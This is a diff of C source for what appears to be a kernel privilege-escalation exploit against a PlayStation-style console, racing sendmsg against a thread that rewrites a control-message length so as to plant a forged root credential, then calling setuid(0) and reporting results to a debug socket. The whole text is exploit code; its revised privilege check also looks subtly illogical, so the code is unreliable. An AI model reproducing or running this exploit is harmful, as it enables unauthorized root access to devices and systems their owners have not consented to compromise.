@@ -24,16 +24,20 @@ struct cmsghdr {
 };
 
 #define IP_RETOPTS 7
-#define ITERATIONS 500000
+#define ITERATIONS 800000
 #define CONTROL_LEN 1024
 #define DEBUG_IP "192.168.100.16"
 #define DEBUG_PORT 9023
 
-uint8_t ucred_hex[] = {
-    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+uint8_t generic_root_ucred[] = {
+    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
 struct cmsghdr *cmsg;
@@ -53,12 +57,10 @@ void *sendmsg_thread(void *arg) {
     _CPU_ZERO(&cpuset);
     _CPU_SET(0, &cpuset);
     syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);
-
     struct msghdr msg;
     memset(&msg, 0, sizeof(msg));
     msg.msg_control = control_buf;
     msg.msg_controllen = CONTROL_LEN;
-
     for (int i = 0; i < ITERATIONS; i++) {
         syscall(28, global_sock, &msg, 0);
     }
@@ -71,9 +73,6 @@ void *race_thread(void *arg) {
     _CPU_ZERO(&cpuset);
     _CPU_SET(1, &cpuset);
     syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);
-
-    if (!cmsg) return NULL;
-
     for (int i = 0; i < ITERATIONS; i++) {
         cmsg->cmsg_len = 0x50;
         cmsg->cmsg_len = 0xFFFF;
@@ -81,13 +80,12 @@ void *race_thread(void *arg) {
     return NULL;
 }
 
-void check_root() {
-    // محاولة تغيير المعرف إلى روت (UID 0)
-    int res = syscall(23, 0); // setuid(0)
-    if (res == 0) {
-        debug_print("[!!!] SUCCESS: EXPLOIT WORKED! UID IS NOW 0 (ROOT)\n");
+void verify_privileges() {
+    if (syscall(24) == 0) {
+        debug_print("[!!!] SUCCESS: UID 0 ACHIEVED\n");
+        syscall(23, 0);
     } else {
-        debug_print("[-] Exploit failed to elevate privileges. Still user.\n");
+        debug_print("[-] Privilege elevation failed\n");
     }
 }
 
@@ -97,37 +95,27 @@ int _main(struct thread *td) {
     initLibc();
     initNetwork();
     initPthread();
-
     debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
-    debug_print("[+] Connected! Target: Vue App ucred Race\n");
-
+    debug_print("[+] Connected! Starting Generic Race...\n");
     global_sock = syscall(97, 2, 2, 0);
     if (global_sock < 0) {
         debug_print("[-] Socket failed\n");
         return -1;
     }
-
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_level = 0;
     cmsg->cmsg_type = IP_RETOPTS;
     cmsg->cmsg_len = 0x50;
-
-    memcpy(control_buf + sizeof(struct cmsghdr), ucred_hex, sizeof(ucred_hex));
-
-    debug_print("[+] Starting Race Threads...\n");
-
+    for(int i = sizeof(struct cmsghdr); i < (CONTROL_LEN - 64); i += 64) {
+        memcpy(control_buf + i, generic_root_ucred, sizeof(generic_root_ucred));
+    }
     ScePthread thread1, thread2;
-    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
-    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
-
+    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr1");
+    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr2");
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
-
-    debug_print("[+] Race finished. Verifying permissions...\n");
-    
-    check_root();
-
+    verify_privileges();
     if (debug_sock > 0) SckClose(debug_sock);
     return 0;
 }
